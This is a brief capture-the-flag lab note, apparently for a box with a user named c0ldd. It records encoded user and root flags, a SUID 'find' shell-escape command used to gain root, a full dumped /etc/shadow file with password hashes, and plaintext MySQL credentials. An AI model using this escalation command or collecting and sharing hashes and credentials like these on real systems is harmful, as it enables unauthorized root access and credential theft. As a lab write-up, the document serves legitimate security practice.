# Confidential Files

## Flags

Note: must be encoded

## User.txt (*found in c0ldd's home directory *)

Flag: `RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==`

## Root.txt (*found in /root*)

Steps:

`find` binary has `SUID` bit set and can spawn shell using `-exec` flag.

Note: `./` indicates that the binary is ran at the directory which the binary reside. (*in this case: /usr/bin*)

```bash
    command: ./find . -exec /bin/sh -p \; 
```

Flag: `wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=`

## /etc/shadow

```bash

root:$6$VMnvWAfh$Yg04FhiScJ8Pv3ET6Ys.4G.BdLC0HyyxcDB1jVa28F20gdz4zI.GyrQSg8elF4nx3yH1g3ZKA/uvO8Fqll.T70:18939:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-timesync:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
systemd-bus-proxy:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
lxd:*:18529:0:99999:7:::
messagebus:*:18529:0:99999:7:::
uuidd:*:18529:0:99999:7:::
dnsmasq:*:18529:0:99999:7:::
c0ldd:$6$AnciUfDx$Y9lDZThc6/Q/rWMajprHD54ynCLBmy8swBujZO.CG6b7j7YZiR/RIrdhzn2euH1A9r2jJE2U0bbLarUFdwSI40:18529:0:99999:7:::
sshd:*:18529:0:99999:7:::
mysql:!:18529:0:99999:7:::

```

## MySQL Creds

`c0ldd:cybersecurity`
